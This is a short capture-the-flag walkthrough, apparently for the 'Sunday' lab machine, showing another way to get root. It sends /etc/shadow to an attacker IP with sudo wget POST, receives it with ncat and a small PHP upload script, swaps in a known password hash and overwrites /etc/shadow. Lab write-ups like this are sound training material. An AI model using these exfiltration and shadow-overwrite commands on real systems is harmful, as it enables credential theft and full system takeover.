# Alternative way to exploit Sunday

## Privilege Escalation to root

Instead of using `wget` and overwriting the _/root/troll_ file to escalate privileges to root, there is also another way.
We will create a script to exfiltrate files and then overwrite _/etc/shadow_.

Read _/etc/shadow_ with `wget` POST parameter:
```markdown
sudo wget --post-file=/etc/shadow 10.10.14.16
```

Listening on the request on our local client:
```markdown
ncat -lvnp 80
```

This displays the contents of the file on our local client.

Lets create the PHP script _upload.php_ which takes a filename as an argument:
```php
<?php
$fname = basename($\_REQUEST['filename']);
file_put_contents('upload/' . $fname, file_get_contents('php://input'));
?>
```

Start a local PHP server:
```markdown
php -S 10.10.14.16:8001 -t .
```

Now instead of just going to our local client, we will request the PHP script with an argument to the filename:
```markdown
sudo wget --post-file=/etc/shadow 10.10.14.16:8001/upload.php?filename=shadow
```

This downloads the _/etc/shadow_ file to our local client and we can modify it. I will replace the hash of root with the hash of _sammy_ because we know his password.

Uploading the modified _shadow_ file to the box:
```markdown
sudo wget 10.10.14.16:8001/shadow -O /etc/shadow
```

Now changing user to root works with the password of _sammy_ and we become root:
```markdown
su -
```
